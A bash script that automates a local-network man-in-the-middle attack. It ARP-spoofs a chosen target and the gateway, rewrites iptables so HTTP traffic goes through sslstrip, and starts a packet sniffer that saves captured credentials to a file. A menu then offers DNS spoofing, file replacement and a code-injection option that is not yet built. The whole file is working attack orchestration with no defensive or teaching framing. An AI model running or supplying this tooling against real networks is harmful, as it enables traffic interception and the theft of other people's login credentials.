#!/bin/bash

trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

MYIP=$(ip route | grep src | cut -d ' ' -f 9)

echo "1" > /proc/sys/net/ipv4/ip_forward

./ARP_netscan.py $1

TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1)
GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)


#run the ARP spoofing script
./arp_spoof.py $TARGET_IP $GATEWAY_IP >> /tmp/arp_log.txt &

sleep 1

echo "Success. You are now the any-gendered person in the middle."

sleep 1

echo ""
echo "Updating firewall rules to forward intercepted webrequests to sslstrip"
echo ""

iptables -F

sleep 1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sslstrip 2>/dev/null &

sleep 1

INTERFACE=$(ip route | grep default | cut -d ' ' -f 5)

echo "Starting packet sniffer on interface ${INTERFACE}"

#DATE=$(date | tr ' ' '-')

#FILENAME="./packet-output-${DATE}"

#echo "Please give full path to output file for any credentials found during packet sniff: "

#read OUTFILE

./packet_sniffer.py $INTERFACE &

echo "Packet sniffing in progress. Any credentials detected over the wire will be saved in ./output.txt"
echo "What attack would you like to run?"
echo "Note: Selecting one of these attacks will end the sslstrip currently in progress, potentially limiting the credentials found by the packet sniffer."
echo ""
echo "1. DNS Spoofing"
echo ""
echo "2. File Replacement"
echo ""
echo "3. Code Injection"
echo ""
read -p ">>" USERNUMBER

if [[ $USERNUMBER == '1' ]]
then

sslstrip_pid=$(ps -aux | grep sslstrip | grep -v 'grep' | awk '{ print $2 }')
kill $sslstrip_pid

echo "Updating firewall rules to forward packets to and from NFQUEUE..."

iptables -t nat -F

sleep 1

iptables -I FORWARD -j NFQUEUE --queue-num 0

sleep 1

echo "Complete."

./dns_spoof.py $MYIP

elif [[ $USERNUMBER == '2' ]]
then
./file_replacer.py

elif [[ $USERNUMBER == '3' ]]
then
echo "That doesn't exist yet"

else
echo "Please enter 1, 2, or 3"

fi

while true
do
sleep 10
done

